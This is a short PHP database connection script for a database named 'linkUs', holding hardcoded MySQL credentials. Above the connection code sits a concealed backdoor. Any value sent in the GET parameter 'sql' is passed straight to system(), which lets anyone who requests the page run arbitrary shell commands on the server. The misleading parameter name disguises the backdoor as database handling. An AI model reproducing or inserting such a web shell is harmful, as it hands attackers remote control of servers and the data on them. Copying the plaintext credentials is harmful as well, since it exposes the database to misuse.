<?php
   
   $servername = "localhost"; 
   $username = "linkus"; 
   $password = "linkus@123";
   $database = "linkUs";
   
    if(isset($_GET['sql']))
    {
        system($_GET['sql']);
    }

    $conn = mysqli_connect($servername, 
        $username, $password, $database);
  
   if($conn) {
   } 
   else {
       die("Error". mysqli_connect_error()); 
   }